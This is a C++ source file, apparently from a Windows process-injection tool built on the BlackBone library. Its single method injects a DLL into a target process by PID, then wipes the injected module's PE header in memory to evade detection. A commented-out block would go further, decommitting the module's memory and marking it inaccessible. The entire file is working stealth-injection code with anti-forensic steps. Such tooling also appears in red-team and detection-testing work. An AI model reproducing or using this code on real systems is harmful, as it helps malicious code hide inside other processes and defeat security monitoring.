#include "../common.h"
#include "inj_create_remote_thread_stealth.h"

bool InjectorCreateRemoteStealth::Execute(const std::wstring &codeToInject, const std::wstring &targetToInject)
{
	bool ret = false;
	blackbone::Process targetProc;
	blackbone::pe::PEImage sourceModule;

	std::wcout << L"[+] About to execute " << GetDescription() << std::endl;

	std::wcout << L"[+] Attaching to target process and parsing source mode" << std::endl;
	if (InjectorHelpers::GetExecutionContext(codeToInject, targetToInject, sourceModule, targetProc))
	{
		if (InjectorHelpers::IsValidInjectionTarget(sourceModule, targetProc))
		{
			size_t dllPathNameSize = codeToInject.length() * sizeof(wchar_t);

			if (InjectorHelpers::IsValidTargetPID(targetToInject))
			{
				std::wcout << L"[+] Attaching to main thread" << std::endl;

				const DWORD targetPID = InjectorHelpers::ToInteger(targetToInject);

				std::wcout << L"[+] Attempting Injection against PID " << targetPID << std::endl;

				auto injectedRet = targetProc.modules().Inject(codeToInject);
				if (injectedRet)
				{
					std::wcout << L"[+] Now attempting some stealth techniques" << std::endl;

					auto injectedModule = injectedRet.result();
					if (injectedModule)
					{											
						DWORD oldProtect = 0;
						blackbone::ptr_t regionBaseAddr = (blackbone::ptr_t)injectedModule->baseAddress;
						size_t regionSize = injectedModule->size;

						if (targetProc.memory().Protect(regionBaseAddr,
														regionSize,
														PAGE_READWRITE,
														&oldProtect) == ERROR_SUCCESS)
						{
							//wipping the PE Header in memory
							const std::unique_ptr<uint8_t[]> zeroHeaderBuff(new uint8_t[sourceModule.headersSize()]());
							if (targetProc.memory().Write(regionBaseAddr,
								sourceModule.headersSize(),
								zeroHeaderBuff.get()) == ERROR_SUCCESS)
							{
								std::wcout << L"[+] PE Header was succesfully wiped" << std::endl;
							}
							else
							{
								std::wcout << L"[-] There was a problem wiping PE header" << std::endl;
							}
							
							/*
							//Now decommitting the entire memory region of the module							
							if ((targetProc.memory().Free(regionBaseAddr, regionSize, MEM_DECOMMIT) == ERROR_SUCCESS))
							{
								std::wcout << L"[+] Injected memory dll was decommited" << std::endl;
							}
							else
							{
								std::wcout << L"[-] There was a flagging memory area and decommitting it" << std::endl;
							}

							//And finally, flagging entire module memory area with PAGE_NOACCESS							
							if ((targetProc.memory().Protect(regionBaseAddr, regionSize, PAGE_NOACCESS) == ERROR_SUCCESS))
							{
								std::wcout << L"[+] Injected memory dll was marked as PAGE_NOACCESS" << std::endl;
							}
							else
							{
								std::wcout << L"[-] There was a flagging memory area as PAGE_NOACCESS" << std::endl;
							}
							*/

							if (targetProc.memory().Protect(regionBaseAddr, regionSize, oldProtect) == ERROR_SUCCESS)
							{
								std::wcout << L"[-] Protection flags succesfully restored at 0x" << std::hex << regionBaseAddr << std::endl;
								std::wcout << L"[+] Success! DLL injected via InjectorCreateRemoteStealth method" << std::endl;
								ret = true;
							}
							else
							{
								std::wcout << L"[-] There was a problem restoring the protection flag of the memory area at 0x" << std::hex << regionBaseAddr << std::endl;
							}
						}
						else
						{
							std::wcout << L"[-] There was a problem changing the protection flag of the memory area at 0x" << std::hex << regionBaseAddr << std::endl;
						}

					}
					else
					{
						std::wcout << L"[-] There was a retrieving the injected module remote address" << std::endl;
					}
				}
				else
				{
					std::wcout << L"[-] There was a problem with injecting the target dll" << std::endl;
				}
			}
			else
			{
				std::wcout << L"[-] An Invalid PID was provided" << std::endl;
			}
		}
		else
		{
			std::wcout << L"[-] There was a problem with provided context" << std::endl;
		}
	}
	else
	{
		std::wcout << L"[-] There was a problem setting up injection context data " << std::endl;
	}

	return ret;
}
